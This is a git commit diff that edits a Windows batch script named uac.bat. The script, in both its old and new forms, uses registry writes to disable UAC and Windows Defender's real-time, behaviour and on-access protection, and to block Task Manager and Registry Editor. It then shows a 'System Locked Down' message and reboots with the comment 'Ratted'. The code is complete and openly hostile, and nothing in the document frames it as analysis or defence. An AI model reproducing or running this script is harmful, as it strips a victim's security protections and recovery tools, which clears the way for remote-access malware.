74411280a081b881371f88d587afe91525d4edf5
Fynnmaster9000 <fynnmaster9000@gmail.com>
2025-07-19 13:36:37 +0200

    Update uac.bat

--- uac.bat
+++ uac.bat
@@ -1,25 +1,25 @@
 @echo off
 
-:: Disable UAC
+:: --- 1. Disable UAC ---
 reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLua /t REG_DWORD /d 0 /f
 
-:: Disable Task Manager
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
-
-:: Disable Registry Editor
-reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
-
-:: Disable Windows Defender (via registry)
+:: --- 2. Disable Windows Defender ---
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
 reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
 
-:: Show message box
-echo MsgBox "All protections disabled. System will now restart.", 64, "Notice" > "%temp%\msgbox.vbs"
+:: --- 3. Disable Task Manager ---
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d 1 /f
+
+:: --- 4. Disable Registry Editor ---
+reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableRegistryTools /t REG_DWORD /d 1 /f
+
+:: --- 5. Show Message Box ---
+echo MsgBox "UAC, Defender, Task Manager, and Regedit have been disabled." ^& vbCrLf ^& "System will now restart.", 64, "System Locked Down" > "%temp%\msgbox.vbs"
 cscript //nologo "%temp%\msgbox.vbs"
 del "%temp%\msgbox.vbs"
 
-:: Restart system
-shutdown /r /t 1 /c "Restarting to apply changes..."
+:: --- 6. Restart System ---
+shutdown /r /t 5 /c "Ratted"
